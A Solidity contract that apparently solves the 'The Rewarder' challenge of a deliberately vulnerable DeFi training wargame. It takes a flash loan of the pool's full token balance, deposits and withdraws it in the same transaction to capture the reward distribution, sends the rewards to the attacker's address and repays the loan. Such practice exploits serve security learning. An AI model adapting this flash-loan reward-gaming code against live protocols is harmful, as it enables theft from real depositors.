// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./FlashLoanerPool.sol";
import "./TheRewarderPool.sol";

contract RewardAttacker{
    address s_hacker;
    FlashLoanerPool public s_loan;
    TheRewarderPool public s_rewarder_pool;
    ERC20 public damn_valuable_token;
    RewardToken s_reward_token;

    constructor(address loan, address rewarder_pool, address luqidity_token, address reward_token) {
        s_hacker = msg.sender;
        s_loan = FlashLoanerPool(loan);
        s_rewarder_pool = TheRewarderPool(rewarder_pool);
        s_reward_token = RewardToken(reward_token);
        damn_valuable_token = ERC20(luqidity_token);
    }

    function attack() external{
        uint256 amount = damn_valuable_token.balanceOf(address(s_loan));
        s_loan.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) public{
        SafeTransferLib.safeApprove(address(damn_valuable_token), address(s_rewarder_pool), amount);
        s_rewarder_pool.deposit(amount);
        s_rewarder_pool.withdraw(amount);
        uint256 rewards = s_reward_token.balanceOf(address(this));
        s_reward_token.transfer(s_hacker, rewards);
        
        SafeTransferLib.safeTransfer(address(damn_valuable_token), address(s_loan), amount);
    }
}
